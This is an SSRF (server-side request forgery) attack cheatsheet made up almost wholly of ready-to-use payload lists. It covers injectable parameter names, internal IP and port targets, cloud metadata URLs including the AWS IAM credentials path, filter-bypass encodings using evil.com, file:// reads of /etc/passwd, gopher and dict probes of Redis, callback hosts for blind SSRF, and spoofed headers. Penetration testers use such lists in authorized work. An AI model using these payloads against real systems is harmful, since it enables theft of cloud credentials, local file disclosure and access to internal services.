# SSRF Cheatsheet

## Step 1: Find Input
```
?url=     ?src=     ?path=     ?fetch=
?load=    ?file=    ?redirect= ?uri=
?img=     ?link=    ?page=     ?ref=
```

## Step 2: Test Basic
```
http://localhost
http://127.0.0.1
http://0.0.0.0
http://[::1]
http://localhost/admin
```

## Step 3: Internal Network
```
http://192.168.0.1
http://10.0.0.1
http://172.16.0.1
http://localhost:8080
http://localhost:3306   ← MySQL
http://localhost:6379   ← Redis
http://localhost:27017  ← MongoDB
```

## Step 4: Cloud Metadata
```
http://169.254.169.254/latest/meta-data/                           ← AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/  ← AWS Keys
http://metadata.google.internal/computeMetadata/v1/                ← GCP
http://169.254.169.254/metadata/instance?api-version=2021-02-01    ← Azure
```

## Step 5: Bypass If Blocked
```
http://127.1/                  ← Short IP
http://2130706433/             ← Decimal
http://0177.0.0.1/             ← Octal
http://127.0.0.1.nip.io/      ← DNS Trick
http://localhost@evil.com/     ← @ Bypass
http://evil.com#localhost/     ← Fragment Bypass
https://google.com@localhost/  ← Authority Confusion
```

## Step 6: Protocol Bypass
```
file:///etc/passwd             ← Local File Read
file:///etc/hosts
file:///proc/net/tcp           ← Internal Ports
dict://localhost:6379/info     ← Redis Info
gopher://localhost:6379/_INFO  ← Advanced
```

## Step 7: Blind SSRF
```
https://YOUR-ID.burpcollaborator.net   ← Burp Pro
https://YOUR-ID.oast.fun               ← interactsh (Free)
```

## Step 8: Headers To Test
```
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost
X-Real-IP: 127.0.0.1
Referer: http://localhost/admin
Host: localhost
```

## Quick Wins
```
/admin          ← Internal Admin Panel
/api/           ← Internal API
/health         ← Health Endpoint
/metrics        ← Sensitive Metrics
/actuator       ← Spring Boot Actuator
/swagger        ← API Docs
```
